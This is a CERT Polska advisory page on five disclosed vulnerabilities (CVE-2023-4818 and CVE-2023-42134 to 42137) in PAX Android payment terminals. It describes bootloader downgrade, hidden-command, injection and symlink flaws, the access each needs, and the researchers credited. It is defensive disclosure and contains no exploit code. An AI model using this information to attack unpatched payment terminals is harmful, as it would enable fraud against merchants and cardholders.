* [CSIRT GOV](https://csirt.gov.pl/)
* [CSIRT MON](https://csirt-mon.wp.mil.pl/)



=== Content from cert.pl_cd4cddb6_20250110_131950.html ===


[Report an incident](https://incydent.cert.pl/#!/lang=en)

Back

* You're in the menu
* About us
  + About us
  + [About our team](../../../../about-us/)
  + [Contact](../../../../contact/)
* [News](../../../../news/)
* For experts
  + For experts
  + [News](../../../../news/)
  + [Publications](../../../../publications/)
  + [The Warning List](../../../../warning-list/)
  + Projects
  + [n6](../../../../n6/)
  + [Artemis](/en/posts/2024/01/artemis-security-scanner/)
  + [MWDB](https://mwdb.cert.pl/)
  + CVD program
  + [CVD policy](../../../../cvd)
  + [Advisories](../../../../cve)

* About us
* [News](../../../../news/)
* For experts

[Report an incident](https://incydent.cert.pl/#!/lang=en)

About us
[About our team](../../../../about-us/)
[Contact](../../../../contact/)

Baza wiedzy
[FaÃ…Â‚szywe inwestycje](/falszywe-inwestycje)
[UwaÃ…Â¼aj na faÃ…Â‚szywe sklepy online](/falszywe-sklepy)
[(Nie)bezpieczne pÃ…Â‚atnoÃ…Â›ci](/baza-wiedzy/niebezpieczne-platnosci)
[FaÃ…Â‚szywi konsultanci](/baza-wiedzy/falszywi-konsultanci)
[Zadbaj o bezpieczne hasÃ…Â‚a i logowanie](/bezpieczne-hasla)
[FaÃ…Â‚szywe zaÃ…Â‚Ã„Â…czniki w mailach](/falszywe-zalaczniki)
[FaÃ…Â‚szywe proÃ…Â›by o szybki przelew](/szybkie-przelewy)
[FaÃ…Â‚szywe SMSy - plaga ostatnich miesiÃ„Â™cy](/baza-wiedzy/falszywe-smsy)

Biuletyn OUCH!
[Porady bezpieczeÃ…Â„stwa OUCH!](/ouch)

For experts
[Publications](../../../../publications/)
[The Warning List](../../../../warning-list/)

Projects
[n6](../../../../n6/)
[Artemis](/en/posts/2024/01/artemis-security-scanner/)
[MWDB](https://mwdb.cert.pl/)

CVD program
[CVD policy](../../../../cvd)
[Advisories](../../../../cve)

Several vulnerabilities in PAX payment terminals

15 January 2024
| [CERT Polska](../../../../author/cert-polska/) | [#vulnerability](../../../../tag/vulnerability/), [#warning](../../../../tag/warning/), [#cve](../../../../tag/cve/)

| **CVE ID** | [CVE-2023-4818](https://www.cve.org/CVERecord?id=CVE-2023-4818) |
| --- | --- |
| **Publication date** | 15 January 2024 |
| **Vendor** | PAX Technology |
| **Product** | A920 |
| **Vulnerable versions** | All through A920\_AP\_Boot\_Release\_V5.14 |
| **Vulnerability type (CWE)** | Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection') ([CWE-74](https://cwe.mitre.org/data/definitions/74.html)) |
| **Report source** | Report to CERT Polska |
| **CVE ID** | [CVE-2023-42134](https://www.cve.org/CVERecord?id=CVE-2023-42134) |
| --- | --- |
| **Publication date** | 15 January 2024 |
| **Vendor** | PAX Technology |
| **Product** | All Android based PAX POS terminals |
| **Vulnerable versions** | All through 11.1.45\_20230314 |
| **Vulnerability type (CWE)** | Hidden Functionality ([CWE-912](https://cwe.mitre.org/data/definitions/912.html)) |
| **Report source** | Report to CERT Polska |
| **CVE ID** | [CVE-2023-42135](https://www.cve.org/CVERecord?id=CVE-2023-42135) |
| --- | --- |
| **Publication date** | 15 January 2024 |
| **Vendor** | PAX Technology |
| **Product** | A920 Pro and A50 |
| **Vulnerable versions** | All through 11.1.50\_20230614 |
| **Vulnerability type (CWE)** | Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection') ([CWE-74](https://cwe.mitre.org/data/definitions/74.html)) |
| **Report source** | Report to CERT Polska |
| **CVE ID** | [CVE-2023-42136](https://www.cve.org/CVERecord?id=CVE-2023-42136) |
| --- | --- |
| **Publication date** | 15 January 2024 |
| **Vendor** | PAX Technology |
| **Product** | All Android based POS terminals |
| **Vulnerable versions** | All through 11.1.50\_20230614 |
| **Vulnerability type (CWE)** | Improper Neutralization of Special Elements used in a Command ('Command Injection') ([CWE-77](https://cwe.mitre.org/data/definitions/77.html)) |
| **Report source** | Report to CERT Polska |
| **CVE ID** | [CVE-2023-42137](https://www.cve.org/CVERecord?id=CVE-2023-42137) |
| --- | --- |
| **Publication date** | 15 January 2024 |
| **Vendor** | PAX Technology |
| **Product** | All Android based POS terminals |
| **Vulnerable versions** | All through 11.1.50\_20230614 |
| **Vulnerability type (CWE)** | Improper Link Resolution Before File Access ('Link Following') ([CWE-59](https://cwe.mitre.org/data/definitions/59.html)) |
| **Report source** | Report to CERT Polska |

## Description

CERT Polska has received a report about vulnerabilities found in multiple Point Of Sale (POS) devices produced by PAX and participated in coordination of their disclosure. All the vulnerabilities have been confirmed by the vendor and fixed in newer releases. Details of the reported bugs can be found on the researchers [blog post](https://blog.stmcyber.com/pax-pos-cves-2023/).

* The vulnerability [CVE-2023-4818](https://www.cve.org/CVERecord?id=CVE-2023-4818) in PAX A920 device allows to downgrade bootloader due to a bug in its version check. The signature is correctly checked and only bootloader signed by PAX can be used.Ã‚Â The attacker must have physical USB access to the device in order to exploit this vulnerability.
* The vulnerability [CVE-2023-42134](https://www.cve.org/CVERecord?id=CVE-2023-42134) in all PAX Android based POS devices with PayDroid\_8.1.0\_Sagittarius\_V11.1.45\_20230314 or earlier can allow the signed partition overwrite and subsequently local code execution via a hidden command. The attacker must have physical USB access to the device in order to exploit this vulnerability.
* The vulnerability [CVE-2023-42135](https://www.cve.org/CVERecord?id=CVE-2023-42135) in PAX A920Pro/A50 devices with PayDroid\_8.1.0\_Sagittarius\_V11.1.50\_20230614 or earlier can allow local code execution via parameter injection by bypassing the input validation when flashing a specific partition. The attacker must have physical USB access to the device in order to exploit this vulnerability.
* The vulnerability [CVE-2023-42136](https://www.cve.org/CVERecord?id=CVE-2023-42136) in all PAX Android based POS devices with PayDroid\_8.1.0\_Sagittarius\_V11.1.50\_20230614 or earlier can allow the execution of arbitrary commands with system account privilege by shell injection starting with a specific word. The attacker must have shell access to the device in order to exploit this vulnerability.
* The vulnerability [CVE-2023-42137](https://www.cve.org/CVERecord?id=CVE-2023-42137) in all PAX Android based POS devices with PayDroid\_8.1.0\_Sagittarius\_V11.1.50\_20230614 or earlier can allow for command execution with high privileges by using malicious symlinks. The attacker must have shell access to the device in order to exploit this vulnerability.

## Credits

We thank Hubert Jasudowicz, Adam KliÃ…Â› and other members of STM Cyber R&D team for the responsible vulnerability report.

---

More about the coordinated vulnerability disclosure process at CERT Polska can be found at [https://cert.pl/en/cvd/](https://cert.pl/cvd/).

CERT Polska is a team operating within the structures of NASK - National Research Institute,
established in 1996 to respond to computer security incidents. It carries out the role of
CSIRT NASK, one of three such teams operating at the national level within the Polish national
cybersecurity system.

# Social media

[![](/theme/assets/img/img.gif)Facebook](https://www.facebook.com/CERT.Polska/)
[![](/theme/assets/img/img.gif)X](https://x.com/CERT_Polska_en)
[![](/theme/assets/img/img.gif)LinkedIn](https://www.linkedin.com/showcase/cert-polska)
[![](/theme/assets/img/img.gif)GitHub](https://github.com/CERT-Polska)

# Contact

Address: Kolska 12, 01-045 Warsaw, Poland

ePUAP: /NASK-Instytut/SkrytkaESP

e-DorÃ„Â™czenia: AE:PL-60057-61611-BCEGR-11

E-mail: [[emailÂ protected]](/cdn-cgi/l/email-protection#0861666e67486b6d7a7c267864)

Incident reporting: [incydent.cert.pl](https://incydent.cert.pl/#!/lang=en)

[[emailÂ protected]](/cdn-cgi/l/email-protection#dcbfb9aea89cbfb9aea8f2acb0)

![Co-financed by the Connecting Europe Facility of The European Union](/theme/assets/img/ue-en.png)

* Ã‚Â© 2025 [NASK](https://nask.pl/)
* [Privacy policy](/uploads/misc/privacy-policy-en.pdf)
* [CSIRT GOV](https://csirt.gov.pl/)
* [CSIRT MON](https://csirt-mon.wp.mil.pl/)


